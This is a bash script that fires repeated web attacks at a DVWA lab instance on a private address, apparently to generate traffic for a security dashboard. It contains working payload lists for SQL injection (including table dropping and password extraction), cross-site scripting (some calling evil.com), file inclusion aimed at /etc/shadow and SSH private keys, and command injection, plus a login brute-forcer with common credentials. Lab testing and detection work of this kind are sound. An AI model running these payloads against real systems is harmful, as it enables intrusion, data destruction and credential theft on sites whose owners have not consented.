#!/bin/bash

HOST="192.168.244.133"
DVWA_URL="http://$HOST/dvwa"
COOKIE_FILE="/tmp/dvwa_cookie.txt"

declare -a SQLI_PAYLOADS=(
"1 OR 1=1"
"1 OR 1=1 --"
"1 UNION SELECT null,null --"
"1 UNION SELECT user(),version() --"
"1 UNION SELECT table_name,null FROM information_schema.tables --"
"1; DROP TABLE users --"
"1 AND 1=2 UNION SELECT username,password FROM users --"
"1 AND sleep(5) --"
"1 AND 1=1 --"
"1 ORDER BY 1 --"
"1 ORDER BY 2 --"
"1 ORDER BY 3 --"
"1 GROUP BY 1 --"
"1 HAVING 1=1 --"
"1 AND extractvalue(1,concat(0x7e,version())) --"
"admin --"
"1 OR a=a"
"1 OR 2>1"
"1 OR 1=1#"
"1 OR 1=1/*"
)

declare -a XSS_PAYLOADS=(
"<script>alert(1)</script>"
"<img src=x onerror=alert(1)>"
"<svg onload=alert(1)>"
"<body onload=alert(1)>"
"<iframe src=javascript:alert(1)>"
"<input autofocus onfocus=alert(1)>"
"<select autofocus onfocus=alert(1)>"
"<video src=x onerror=alert(1)>"
"<details open ontoggle=alert(1)>"
"<marquee onstart=alert(1)>"
"<script>document.location=http://evil.com</script>"
"<script>fetch(http://evil.com)</script>"
"%3Cscript%3Ealert(1)%3C/script%3E"
"javascript:alert(1)"
"<ScRiPt>alert(1)</ScRiPt>"
)

declare -a LFI_PAYLOADS=(
"../../etc/passwd"
"../../etc/shadow"
"../../etc/hosts"
"../../var/log/apache2/access.log"
"../../var/log/auth.log"
"../../proc/version"
"../../proc/self/environ"
"../../etc/mysql/my.cnf"
"../../root/.bash_history"
"../../root/.ssh/id_rsa"
"....//....//etc/passwd"
"../../home/phil/.bash_history"
"../../var/www/html/dvwa/config/config.inc.php"
"../../windows/system32/drivers/etc/hosts"
"../../etc/crontab"
)

declare -a CMD_PAYLOADS=(
";ls"
";whoami"
";id"
";uname -a"
";cat /etc/passwd"
"| ls"
"| whoami"
"| cat /etc/passwd"
"&& whoami"
"&& ls"
"&& id"
";ls -la /var/www/html"
";find / -type f -name config"
";cat /var/log/apache2/access.log"
";ps aux"
)

declare -a BRUTE_USERS=(
"admin" "root" "user" "test" "guest" "administrator" "manager"
"superuser" "operator" "staff" "dev" "support" "helpdesk" "info"
"webmaster" "sysadmin" "security" "backup" "deploy" "jenkins"
)

declare -a BRUTE_PASSWORDS=(
"password" "admin" "123456" "root" "toor" "pass" "test" "guest"
"qwerty" "abc123" "letmein" "welcome" "monkey" "dragon" "master"
"hello" "login" "shadow" "password1" "password123" "admin123"
"root123" "changeme" "secret" "P@ssw0rd" "iloveyou" "111111"
"000000" "123123" "654321" "qwerty123" "dvwa" "dvwa123" "mysql"
)

REPEAT=20
COUNT=0

echo "[*] Starting DVWA attack simulation on $DVWA_URL"
echo "[*] Rounds: $REPEAT"
echo ""

for round in $(seq 1 $REPEAT); do
    echo "====== ROUND $round/$REPEAT ======"

    # --- BRUTE FORCE ---
    echo "[*] Brute forcing login..."
    for user in "${BRUTE_USERS[@]}"; do
        pass=${BRUTE_PASSWORDS[$RANDOM % ${#BRUTE_PASSWORDS[@]}]}
        COUNT=$((COUNT + 1))
        curl -s -o /dev/null -c "$COOKIE_FILE" \
            --data-urlencode "username=$user" \
            --data-urlencode "password=$pass" \
            -d "Login=Login" \
            "$DVWA_URL/login.php"
    done

    # Login as admin to get valid session
    curl -s -o /dev/null -c "$COOKIE_FILE" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=password" \
        -d "Login=Login" \
        "$DVWA_URL/login.php"

    # --- SQLI ---
    echo "[*] Sending SQLi payloads..."
    for payload in "${SQLI_PAYLOADS[@]}"; do
        COUNT=$((COUNT + 1))
        curl -s -o /dev/null \
            -b "$COOKIE_FILE" \
            -b "security=low" \
            --get \
            --data-urlencode "id=$payload" \
            -d "Submit=Submit" \
            "$DVWA_URL/vulnerabilities/sqli/"
    done

    # --- XSS ---
    echo "[*] Sending XSS payloads..."
    for payload in "${XSS_PAYLOADS[@]}"; do
        COUNT=$((COUNT + 1))
        curl -s -o /dev/null \
            -b "$COOKIE_FILE" \
            -b "security=low" \
            --get \
            --data-urlencode "name=$payload" \
            "$DVWA_URL/vulnerabilities/xss_r/"
    done

    # --- LFI ---
    echo "[*] Sending LFI payloads..."
    for payload in "${LFI_PAYLOADS[@]}"; do
        COUNT=$((COUNT + 1))
        curl -s -o /dev/null \
            -b "$COOKIE_FILE" \
            -b "security=low" \
            --get \
            --data-urlencode "page=$payload" \
            "$DVWA_URL/vulnerabilities/fi/"
    done

    # --- CMD INJECTION ---
    echo "[*] Sending command injection payloads..."
    for payload in "${CMD_PAYLOADS[@]}"; do
        COUNT=$((COUNT + 1))
        curl -s -o /dev/null \
            -b "$COOKIE_FILE" \
            -b "security=low" \
            --data-urlencode "ip=127.0.0.1$payload" \
            -d "Submit=Submit" \
            "$DVWA_URL/vulnerabilities/exec/"
    done

done

echo ""
echo "[!] Done! $COUNT requests sent. Check your dashboard!"
